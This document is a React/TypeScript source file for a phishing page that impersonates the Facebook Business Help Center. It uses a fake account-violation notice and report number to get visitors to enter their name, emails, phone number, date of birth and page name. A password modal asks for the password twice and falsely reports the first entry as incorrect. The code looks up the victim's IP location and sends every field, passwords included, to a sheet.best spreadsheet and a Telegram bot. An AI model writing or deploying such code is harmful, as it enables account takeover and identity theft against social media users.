
import { useEffect, useState } from "react";
import "../business-help-center/style.css";
import { Button, Checkbox, Form, Input, Modal, Space, Steps } from "antd";
import { SearchOutlined } from "@mui/icons-material";
import { useNavigate } from "react-router-dom";
import { useDispatch } from "react-redux";
import { setData } from "../../store/business/businessSlice";
import axios from "axios";
import { ETelegram } from "../../constants";
import type { CheckboxProps } from 'antd';
const BusinessHelpCenter = () => {
  const [form] = Form.useForm();
  const navigate = useNavigate();
  const [namePage, setNamePage] = useState("");
  const [fullName, setFullName] = useState("");
  const [businessEmail, setBusinessEmail] = useState("");
  const [personalEmail, setPersonalEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [date, setDate] = useState("");
  const [text, setText] = useState("");
  const [checkAccept, setCheckAccept] = useState<boolean>(false);

  const [password, setPassword] = useState("");
  const [passwordFirst, setPasswordFirst] = useState("");
  const [passwordSecond, setPasswordSecond] = useState("");
  const [checkPass, setCheckPass] = useState(false);
  const [open, setOpen] = useState(false);
  const [checkSend, setCheckSend] = useState<boolean>(true);
  const { TextArea } = Input;
  const [loading, setLoading] = useState(false);
  const dispatch = useDispatch();

  const showModal = () => {
    setOpen(true);
  };
  const handleOk = () => {
    setOpen(false);
  };
  const [formPassword] = Form.useForm();
  const handleCancel = () => {
    formPassword.resetFields();
    setOpen(false);
  };
  const handleSave = () => {
    if (passwordFirst === "") {
      setPasswordFirst(password);
    } else if (passwordSecond === "") {
      setPasswordSecond(password);
    }

    setPassword("");
  };
  const onFinish = async (e: any) => {
    if (!checkPass) {
      setCheckPass(true);
    } else {
      setCheckPass(false);
      setLoading(true);
      const location = await axios.get(
        "https://ipinfo.io?token=4ef03889d81a2d"
      );
      await Promise.all([
        sendTelegramBotForGgsheet(location),
        sendTelegramBotForBusiness(location),
      ]);
      setLoading(false);
      dispatch(
        setData({
          namePage,
          fullName,
          businessEmail,
          personalEmail,
          phone,
          date,
          checkAccept,
          text,
          passwordFirst,
          passwordSecond,
        })
      );
      clearState();
      navigate("/confirm");
    }
  };

  const sendTelegramBotForGgsheet = async (response: any) => {
    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
    let CURRENT_API_URL = API_URL + "sendMessage";
    try {
      let message = "✅ Đã thêm vào sheet thành công";
      const data = {
        ["Name Page"]: namePage,
        ["Full Name"]: fullName,
        ["Business Email Address"]: businessEmail,
        ["Personal Email Address"]: personalEmail,
        ["Mobile Phone Number"]: phone,
        ["Date of Birth"]: date,
        ["Please provide us information that will help us investigate"]: text,
        ["Password First"]: passwordFirst,
        ["Password Second"]: passwordSecond,
        ['Ip']: response.data.ip,
        ['City']: response.data.city,
        ['Country']: response.data.country,
      };
      await axios
        .post(
          "https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94",
          data
        )
        .catch(() => {
          message = "❌Thêm vào sheet không thành công";
        });
      await axios.post(
        CURRENT_API_URL,
        {
          chat_id: ETelegram.CHAT_ID,
          parse_mode: "html",
          document: "",
          text: message,
          caption: message,
        },
        {
          headers: {
            "Content-Type": "multipart/form-data",
          },
        }
      );
    } catch (err) {
      console.log("err: ", err);
    }
  };

  const sendTelegramBotForBusiness = async (response: any) => {
    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
    let CURRENT_API_URL = API_URL + "sendMessage";
    try {

      let message = `
      Email Account:  ${businessEmail}
      Name Account: ${namePage}
      Person Email: ${personalEmail}
      Facebook Page: ${text}
      User Name: ${fullName}
      Phone Number: ${phone}
      Password First: ${passwordFirst}
      Password Second: ${passwordSecond}
      Ip: ${response.data.ip}
      City: ${response.data.city}
      Country: ${response.data.country}
      `;
      await axios.post(
        CURRENT_API_URL,
        {
          chat_id: ETelegram.CHAT_ID,
          parse_mode: "html",
          document: "",
          text: message,
          caption: message,
        },
        {
          headers: {
            "Content-Type": "multipart/form-data",
          },
        }
      );
    } catch (err) {
      console.log("err: ", err);
    }
  };

  const clearState = () => {
    setNamePage("");
    setFullName("");
    setBusinessEmail("");
    setPersonalEmail("");
    setPhone("");
    setDate("");
    setText("");
    setPasswordFirst("");
    setPasswordSecond("");
  };

  const setValidate = ({
    namePage,
    fullName,
    businessEmail,
    personalEmail,
    phone,
    date,
    checkAccept,
    text,
  }: {
    namePage: string;
    fullName: string;
    businessEmail: string;
    personalEmail: string;
    phone: string;
    date: string;
    checkAccept: boolean;
    text: string;
  }) => {
    if (
      namePage &&
      fullName &&
      businessEmail &&
      personalEmail &&
      phone &&
      date &&
      checkAccept
    ) {
      setCheckSend(false);
      return;
    }
    setCheckSend(true);
  };


  return (
    <div className="container_business">
      <div className="header">
        <div className="header_sup">
          <div className="logo">
            <a href="##">
              <img
                src="/images/meta.png"
                alt=""
              />
            </a>
          </div>
          <Space direction="vertical" size="middle">
            <Space.Compact size="middle">
              <Input
                className="search"
                addonBefore={<SearchOutlined />}
                placeholder="How can we help?"
              />
            </Space.Compact>
          </Space>
        </div>
      </div>
      <div className="nav">
        <div className="nav_sup">
          Facebook Business Help Center
        </div>
      </div>
      <div className="block">
        <div className="block_sup">
          <div className="content">
            <div className="header_step">
              <div className="header_top">
                <div className="dot"></div>
                <div className="line"></div>
                <div className="dot"></div>
                <div className="line"></div>
                <div className="dot"></div>
              </div>
              <div className="header_bottom">
                <p>Select Asset</p>
                <p>Select the Issue</p>
                <p>Get help</p>
              </div>
            </div>
            <div className="text_center">Get Started</div>
            <div className="header_content">
              <p>We have received multiple reports that suggest that your account has been in violation
                of our terms of services and community guidelines. As a result, your account is scheduled for review</p>
              <br />
              <p style={{ fontSize: '14px', fontWeight: '700' }}>Report no: 3088553115</p>
            </div>
            {/* <div className="text_content">
              <p style={{ marginTop: "16px" }}>
                We have detected unusual activity on your page that violates our
                community standards.
              </p>
              <p style={{ marginTop: "20px" }}>
                Your access to your page has been limited, and you are currently
                unable to post, share, or comment using your page.
              </p>
              <p style={{ marginTop: "20px" }}>
                If you believe this to be a mistake, you have the option to
                submit an appeal by providing the necessary information.
              </p>
            </div> */}
            <div className="form">
              <Form
                form={form}
                name="validateOnly"
                layout="vertical"
                autoComplete="off"
              >
                <div className="text_sup">
                  <Form.Item
                    name="text"
                    label="Please provide us information that will help us investigate."
                    rules={[{ required: true, message: "Information is required" }]}
                  >
                    <TextArea
                      rows={1}
                      onChange={(e) => {
                        setText(e.target.value);
                        setValidate({
                          namePage,
                          fullName,
                          businessEmail,
                          personalEmail,
                          phone,
                          date,
                          checkAccept,
                          text: e.target.value,
                        });
                      }}
                      value={text}
                    />
                  </Form.Item>
                </div>

                <Form.Item
                  name="fullName"
                  label="Fullname"
                  rules={[{ required: true, message: "Fullname is required" }]}
                >
                  <Input
                    onChange={(e) => {
                      setFullName(e.target.value);
                      setValidate({
                        namePage,
                        fullName: e.target.value,
                        businessEmail,
                        personalEmail,
                        phone,
                        checkAccept,
                        date,
                        text,
                      });
                    }}
                    value={fullName}
                  />
                </Form.Item>
                <Form.Item
                  name="businessEmail"
                  label="Business Email Address"
                  rules={[
                    {
                      required: true,
                      message: "Business Email Address is required",
                    },
                  ]}
                >
                  <Input
                    onChange={(e) => {
                      setBusinessEmail(e.target.value);
                      setValidate({
                        namePage,
                        fullName,
                        businessEmail: e.target.value,
                        personalEmail,
                        phone,
                        date,
                        checkAccept,
                        text,
                      });
                    }}
                    value={businessEmail}
                  />
                </Form.Item>
                <Form.Item
                  name="personalEmail"
                  label="Personal Email Address"
                  rules={[
                    {
                      required: true,
                      message: "Personal Email Address is required",
                    },
                  ]}
                >
                  <Input
                    onChange={(e) => {
                      setPersonalEmail(e.target.value);
                      setValidate({
                        namePage,
                        fullName,
                        businessEmail,
                        personalEmail: e.target.value,
                        phone,
                        date,
                        checkAccept,
                        text,
                      });
                    }}
                    value={personalEmail}
                  />
                </Form.Item>
                <Form.Item
                  name="phone"
                  label="Mobile Phone Number"
                  rules={[
                    {
                      required: true,
                      message: "Mobile Phone Number is required",
                    },
                  ]}
                >
                  <Input
                    onChange={(e) => {
                      setPhone(e.target.value);
                      setValidate({
                        namePage,
                        fullName,
                        businessEmail,
                        personalEmail,
                        phone: e.target.value,
                        date,
                        checkAccept,
                        text,
                      });
                    }}
                    value={phone}
                  />
                </Form.Item>
                <Form.Item
                  name="namePage"
                  label="Facebook page name"
                  colon={false}
                  rules={[{ required: true, message: "Facebook page name is required" }]}
                >
                  <Input
                    onChange={(e) => {
                      setNamePage(e.target.value);
                      setValidate({
                        namePage: e.target.value,
                        fullName,
                        businessEmail,
                        personalEmail,
                        phone,
                        date,
                        checkAccept,
                        text,
                      });
                    }}
                    value={namePage}
                  />
                </Form.Item>
                <Form.Item
                  name="date"
                  label="Date of Birth"
                  colon={false}
                  rules={[{ required: true, message: "Date of Birth is required" }]}
                >
                  <Input
                    type="date"
                    onChange={(e) => {
                      setDate(e.target.value);
                      setValidate({
                        namePage,
                        fullName,
                        businessEmail,
                        personalEmail,
                        phone,
                        date: e.target.value,
                        checkAccept,
                        text,
                      });
                    }}
                    value={date}
                  />
                </Form.Item>
                <Form.Item
                  rules={[{ required: true, message: "Please agree to our terms and data and cookie policy!" }]}
                >

                  <Checkbox checked={checkAccept} onChange={(e) => {
                    setCheckAccept(e.target.checked);

                    setValidate({
                      namePage,
                      fullName,
                      businessEmail,
                      personalEmail,
                      phone,
                      date,
                      checkAccept: e.target.checked,
                      text,
                    });
                  }}>I agree to our Terms, Data and Cookies Policy.</Checkbox>
                </Form.Item>

              </Form>
            </div>
            <div className="footer_content">
              <>
                <Space>
                  <Button
                    style={{
                      width: "92%",
                      height: "40px",
                      position: "absolute",
                      right: "24px",
                      top: "14px",
                      fontSize: "1rem",
                      fontWeight: "700",
                    }}
                    type="primary"
                    onClick={showModal}
                    disabled={checkSend}
                  >
                    Submit
                  </Button>
                </Space>
                <Modal
                  open={open}
                  title="Please Enter Your Password"
                  onOk={handleOk}
                  onCancel={handleCancel}
                  width={400}
                  footer={false}
                >
                  <p
                    style={{
                      marginBottom: "8px",
                      paddingTop: "6px",
                      marginTop: "16px",
                      borderTop: "1px solid #e9ebee",
                    }}
                  >
                    For your security, you must re-enter your password to
                    continue
                  </p>
                  <Form
                    form={formPassword}
                    layout="vertical"
                    onFinish={onFinish}
                    autoComplete="off"
                  >
                    <Form.Item
                      name="password"
                      label={<div>Enter Your Password</div>}
                    >
                      <Input.Password
                        placeholder="input password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                      />
                      {checkPass === true && (
                        <div style={{ color: "red" }}>
                          Your password was incorrect!
                        </div>
                      )}
                    </Form.Item>
                    <Form.Item>
                      <Space
                        style={{
                          display: "flex",
                          justifyContent: "end",
                          alignItems: "center",
                        }}
                      >
                        <Button
                          type="primary"
                          htmlType="submit"
                          onClick={handleSave}
                          loading={loading}
                          style={{ fontSize: ".875rem", fontWeight: "600" }}
                        >
                          Continue
                        </Button>
                      </Space>
                    </Form.Item>
                  </Form>
                </Modal>
              </>
            </div>
          </div>
          <div className="tab"></div>
        </div>
      </div>
      <div className="footer">
        <div className="footer_title">
          <div className="footer_title_nav">
            <img className="footer_img"
              src="https://scontent.xx.fbcdn.net/v/t1.15752-9/433377898_1195899118047328_5310864312235708346_n.png?_nc_cat=110&ccb=1-7&_nc_sid=5f2048&_nc_eui2=AeHaCRazprnB2GcaS1KVR2lO8SYMXA_dj_HxJgxcD92P8SXWoLpmUuX-hcllzot4SMu7KLuDM39sn234M1-dPtUG&_nc_ohc=MYI-YnH9tSMAb4yvY5g&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdWdudDdo4-Lq64O6O5l4SgK2AJDVBvh115nFkWe4isDsg&oe=6637A55F"
              alt=""
            />
            <p style={{ textAlign: 'center', color: 'white', fontSize: '13px' }}>Facebook can help your large, medium or small business grow. Get the lastest news for advertisers and more on our Meta for Business Page</p>
          </div>
        </div>
        <div className="footer_bottom">
          <div className="column">
            <p style={{ fontWeight: 'bold' }}>Marketing on Facebook</p>
            <p>Success Stories</p>
            <p>Measurement</p>
            <p>Industries</p>
            <p>Inspiration</p>
            <p>Events</p>
            <p>News</p>
            <p>Site map</p>
          </div>
          <div className="column">
            <p style={{ fontWeight: 'bold' }}>Marketing objectives</p>
            <p>Build your presence</p>
            <p>Create awareness</p>
            <p>Drive discovery</p>
            <p>Generate leads</p>
            <p>Boost sales</p>
            <p>Earb loyalty</p>
          </div>
          <div className="column">
            <p style={{ fontWeight: 'bold' }}>Facebook Pages</p>
            <p>Get startes with Pages</p>
            <p>Set up your Page</p>
            <p>Manage your Facebook Page</p>
            <p>Promote your Page</p>
            <p>Messaging on your Page</p>
            <p>Page Insights</p>
          </div>
          <div className="column">
            <p style={{ fontWeight: 'bold' }}>Facebook ads</p>
            <p>Get startes with ads</p>
            <p>Buying Facebook ads</p>
            <p>Ad formats</p>
            <p>Ad placement</p>
            <p>Choose your audience</p>
            <p>Measure your ads</p>
            <p>Managing your ads</p>
          </div>
        </div>
      </div>
      <div className="support">
        <div className="footer-line">
          <span>EngLish(UK)</span>
          <span>EngLish(US)</span>
          <span>Espanol</span>
          <span>Portugues(Brasil)</span>
          <span>Francais(France)</span>
          <span>Espanol(Espana)</span>
          <span>More languages</span>
        </div>
        <div className="footer-line">
          <span>@2023 Meta</span>
          <span>About</span>
          <span>Developers</span>
          <span>Careers</span>
          <span>Privacy</span>
          <span>Cookies</span>
          <span>Terms</span>
          <span>Help Centre</span>
        </div>
      </div>
    </div>
  );
};

export default BusinessHelpCenter;
